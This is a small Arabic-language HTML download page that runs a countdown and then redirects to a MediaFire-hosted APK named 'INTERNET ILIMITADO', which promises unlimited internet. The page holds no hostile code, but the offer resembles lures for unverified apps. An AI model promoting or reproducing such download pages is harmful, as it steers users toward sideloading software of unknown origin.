<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تحميل التطبيق</title>

<style>
body{
    margin:0;
    font-family:Arial;
    background:#0b1f4b;
    text-align:center;
    color:white;
}

.container{
    margin-top:80px;
}

.logo{
    width:200px;
    margin-bottom:30px;
}

button{
    background:#ff0000;
    padding:18px 40px;
    font-size:22px;
    border:none;
    border-radius:12px;
    color:white;
    cursor:pointer;
}

button:hover{
    background:#cc0000;
}

#countdown{
    font-size:28px;
    margin-top:25px;
    display:none;
}
</style>
</head>

<body>

<div class="container">

<img class="logo" src="https://i.imgur.com/JqEuJ6t.png">

<h2>تحميل INTERNET ILIMITADO</h2>

<button onclick="startDownload()">تحميل الآن</button>

<div id="countdown"></div>

</div>

<script>
function startDownload(){

    let time = 5;
    let box = document.getElementById("countdown");
    box.style.display="block";

    let timer = setInterval(function(){

        box.innerHTML = "سيبدأ التحميل بعد " + time + " ثواني";

        time--;

        if(time < 0){
            clearInterval(timer);
            window.location.href="https://www.mediafire.com/file/yta55fap4w6x0mj/INTERNET_ILIMITADO_2.1.apk/file";
        }

    },1000);
}
</script>

</body>
</html>
